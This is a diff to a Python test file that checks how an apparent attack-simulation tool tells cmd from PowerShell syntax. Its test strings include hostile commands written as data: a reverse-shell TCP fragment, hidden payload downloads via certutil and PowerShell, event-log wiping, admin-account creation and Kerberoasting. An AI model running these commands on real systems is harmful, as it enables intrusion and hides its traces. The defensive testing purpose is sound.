@@ -118,12 +118,83 @@ class TestDialectInference:
         ('cmd.exe /c "whoami & net user /domain"', "cmd"),
         ("for /L %i in (1,1,10) do @curl.exe -s http://h/ & timeout /t 3 >nul", "cmd"),
         ("certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin", "cmd"),
-        ('powershell.exe -w hidden -c "curl.exe http://h/a -o x"', "powershell"),
         ("Get-ChildItem $env:TEMP | Select-Object Name", "powershell"),
         ("avp.exe /c \"cmd.exe /e:ON /v:OFF /d /c whoami\"", "cmd"),
     ])
     def test_inference(self, cmd, expected):
         assert pg.infer_windows_shell(cmd) == expected
+
+    # ── CONT-13: structure, not a hand-picked verb list ──────────────────
+    @pytest.mark.parametrize("cmd", [
+        # the four regression shapes named by the finding
+        '$h="tu-node-a.cortexsim-tim.internal"; $c=[Net.Sockets.TcpClient]::new($h,443)',
+        "Use-STSRoleWithSAML -PrincipalArn $idp -RoleArn $role -SAMLAssertion $b64",
+        # verbs the old 28-verb list lacked
+        "Clear-History",
+        "Compress-Archive -Path x -DestinationPath y.zip",
+        "Rename-Item a b",
+        "Measure-Object",
+        "Expand-Archive x.zip",
+        "Format-List",
+        # other PowerShell structure with no cmdlet at all
+        "& /usr/bin/false",                       # statement-start call operator
+        "whoami /all; net user",                  # `;` separator (cmd has none)
+        "1..3 | % { $_ }",                        # range + alias block
+        "Rubeus.exe kerberoast  # comment",       # `#` comment (cmd has none)
+        "echo 'neutral marker'",                  # provably shell-neutral
+    ])
+    def test_structural_powershell(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "powershell"
+
+    @pytest.mark.parametrize("cmd", [
+        "for /L %i in (1,1,3) do @echo %i",
+        "ipconfig /all & route print & arp -a",
+        "net user x /add && net localgroup administrators x /add",
+        "nltest.exe /dsgetdc:%USERDNSDOMAIN%",
+        "if exist C:\\x.txt del C:\\x.txt",
+        "set FOO=bar",
+        "tasklist | findstr /I \"cortex traps\"",
+    ])
+    def test_structural_cmd(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "cmd"
+
+    def test_mixed_dialect_is_refused_not_sent_to_cmd(self):
+        """SIM-EDR-004 step-01 verbatim. Handed to cmd.exe (the old routing, since
+        `Clear-` was not in the verb list), Clear-History fails; handed to Windows
+        PowerShell 5.1, the infix `&` is a parse error and NOTHING runs."""
+        cmd = "wevtutil cl Security & wevtutil cl System & Clear-History"
+        assert pg.infer_windows_shell(cmd) == "mixed"
+        step = {"id": "step-01", "command": "echo x", "platform_variants": {"windows": cmd}}
+        res = pg.resolve_target(_scn([step]), "windows")
+        assert not res.emittable
+        assert res.unresolved == (("step-01", pg.REASON_MIXED_DIALECT),)
+        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", res.unresolved).to_error()
+        assert "MIXED_DIALECT" in body["detail"]
+        assert "ONE dialect" in body["detail"]
+
+    def test_bare_powershell_invocation_goes_through_cmd(self):
+        """`powershell.exe -Command "…"` is a native invocation. Under an OUTER
+        PowerShell, every `$x` inside those double quotes is interpolated to
+        empty before the inner interpreter sees it (`$c=New-Object …` becomes
+        `=New-Object …`); cmd.exe hands the string through literally and also
+        expands the %STAGE_HOST% an author put inside it (SIM-ASM-005 step-04).
+        It was classified powershell before this change."""
+        assert pg.infer_windows_shell('powershell.exe -w hidden -c "curl.exe http://h/a -o x"') == "cmd"
+        assert pg.infer_windows_shell(
+            'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'127.0.0.1\',4444)"'
+        ) == "cmd"
+        assert pg.infer_windows_shell(
+            'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"'
+        ) == "cmd"
+
+    def test_mixed_cleanup_is_named_as_residue_not_run(self):
+        scn = _scn(
+            [{"id": "step-01", "command": "echo 'x'"}],
+            cleanup={"commands": ["del %TEMP%\\x & Remove-Item $env:TEMP\\y"]},
+        )
+        res = pg.resolve_target(scn, "windows")
+        assert res.cleanup == ()
+        assert res.skipped_cleanup == ("del %TEMP%\\x & Remove-Item $env:TEMP\\y",)
 
     def test_powershell_outranks_an_embedded_cmd_call(self):
         """SIM-EDR-017 step-03 shape: a PowerShell block that shells out to cmd.
